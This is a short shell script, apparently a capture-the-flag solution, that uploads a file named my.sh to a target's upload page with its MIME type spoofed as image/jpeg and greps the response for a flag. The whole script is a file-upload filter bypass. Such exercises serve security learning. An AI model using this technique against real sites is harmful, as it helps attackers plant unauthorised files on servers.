touch ./my.sh
echo -e "\n$(curl -s -X POST \
    -F "uploaded=@my.sh;type=image/jpeg" \
    -F "Upload=Upload" "$1/index.php?page=upload" \
    | grep 'flag')"
